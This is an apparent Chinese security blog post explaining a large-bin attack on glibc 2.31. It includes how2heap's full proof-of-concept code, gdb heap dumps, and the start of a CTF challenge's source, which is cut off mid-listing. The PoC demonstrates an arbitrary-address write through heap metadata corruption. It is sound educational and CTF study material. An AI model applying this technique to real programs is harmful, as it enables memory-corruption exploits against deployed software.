    <content type="html"><![CDATA[<p>一直以为在2.31补丁后，Large bin Attack 就无法使用了。在打比赛bsidesahmedabad CTF时，才发现原来在2.31 下也有骚操作来利用Large bin来进行attack。（唉<del>~</del>(◞‸◟ )tcl…）<a id="more"></a></p><h2 id="Large-bin-Attack目的"><a href="#Large-bin-Attack目的" class="headerlink" title="Large bin Attack目的"></a>Large bin Attack目的</h2><p>Large bin Attack的目的是 利用Large bin 向任意一地址任意一个地址写入一个大数(p2 chunk addr).</p><h2 id="how2heap-源码学习"><a href="#how2heap-源码学习" class="headerlink" title="how2heap 源码学习"></a>how2heap 源码学习</h2><p>经过信息收集，发现在how2heap中更新了Large bin Attack 源码。(ps:菜鸡才知道正版<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>项目有团队在不断维护，中文翻译版how2heap已经没有维护了，啊这…..)</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">        fwd = bck;</span></span><br><span class="line"><span class="comment">        bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 1 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 2 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (bck-&gt;fd != fwd)\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Once again, allocate a guard chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"At this point, we have one chunk in large bin [p1] (%p),\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"               and one chunk in unsorted bin [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n"</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"  the modified p1-&gt;bk_nextsize does not trigger any error\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n"</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n"</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Target (%p) : %p\n"</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="新保护"><a href="#新保护" class="headerlink" title="新保护"></a>新保护</h3><p>由上文源码所说，在2.30后libc 增加了两个检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#check 1：</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n<span class="string">");</span></span><br><span class="line">  malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)\n");</span><br><span class="line"><span class="meta">#check 2:</span></span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br></pre></td></tr></table></figure><p>先说check 2：对当前bin的bk值对应bin的 fd是否为当前bin。</p><p>check 1 对largebin的bk_nextsize进行了跟bk一样的检查，即当前bin的bk_nextsize值对应bin的 fd_nextsize是否为当前bin。</p><h3 id="新利用点"><a href="#新利用点" class="headerlink" title="新利用点"></a>新利用点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这源码中，核心就是利用这段代码。这部分完整的源码在<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831</a></p><p>这个代码在unsorted bin加入largebin时，若unsorted bin 大小大于目前最大largebin时触发。在触发时，被未对<code>fd_nextsize</code>和<code>bk_nextsize</code>进行检查，就直接向<code>victim-&gt;bk_nextsize-&gt;fd_nextsize</code>写入victim的地址。</p><h3 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h3><p>首先我们如下写创建4个chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line"> <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br></pre></td></tr></table></figure><p>让p1 加入了larger bin，此时:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0</span><br></pre></td></tr></table></figure><p>然后释放p2:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);<span class="comment">//修改p1 bk_nextsize 为target+0x20</span></span><br></pre></td></tr></table></figure><p>此时p2为unsortedbin：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x55f31dd5ea30 —▸ 0x7f0c129bbbe0 (main_arena+96) ◂— 0x55f31dd5ea30</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0</span><br></pre></td></tr></table></figure><p>此时P1的内存分布为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;36gx 0x55f31dd5e5e0</span><br><span class="line">0x55f31dd5e5e0: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x55f31dd5e5f0: 0x00007f0c129bbfd0      0x00007f0c129bbfd0</span><br><span class="line">0x55f31dd5e600: 0x000055f31dd5e5e0      0x00007f0c129bee30 （target+0x20)</span><br><span class="line">0x55f31dd5e610: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f31dd5e620: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f31dd5e630: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后我们再让p2进入larger bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br></pre></td></tr></table></figure><p>这时，由于p1&gt;p2,我们的攻击将进行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">//victim在例子中p2</span></span><br><span class="line"><span class="comment">//victim-&gt;bk_nextsize-&gt;fd_nextsize 为我们修改的p1-&gt;bk_nextsize的值</span></span><br><span class="line"><span class="comment">//fwd-&gt;fd-&gt;bk_nextsize为p1-&gt;bk_nextsize</span></span><br></pre></td></tr></table></figure><p>,在target处写入p2地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f0c129bee30:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee40:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee50:   0x000055f31dd5ea30      0x0000000000000000</span><br><span class="line">0x7f0c129bee60:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee70:   0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="例题-bsidesahmedabad-2021-padnote"><a href="#例题-bsidesahmedabad-2021-padnote" class="headerlink" title="例题_bsidesahmedabad_2021_padnote"></a>例题_bsidesahmedabad_2021_padnote</h2><p>题目环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECK_FAIL(ERR) &#123;                       \</span></span><br><span class="line">    <span class="built_in">puts</span>(ERR);                                  \</span><br><span class="line">    <span class="keyword">return</span>;                                     \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NOTE 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line">&#125; Note;</span><br><span class="line"></span><br><span class="line">Note noteList[MAX_NOTE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReadLine</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != <span class="built_in">size</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">0</span>, &amp;c, <span class="keyword">sizeof</span>(c)) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>); <span class="comment">// IO error</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">'\n'</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      buf[i] = c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is in use"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input data length */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;<span class="built_in">size</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">size</span> &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Size must be larger than 0"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize note */</span></span><br><span class="line">  <span class="keyword">if</span> (!(content = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">size</span>)))</span><br><span class="line">    CHECK_FAIL(<span class="string">"Could not allocate the memory"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  ReadLine(content, <span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">  note-&gt;content = content;</span><br><span class="line">  note-&gt;<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EditNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> offset, count, epos;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input offset */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Offset: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span 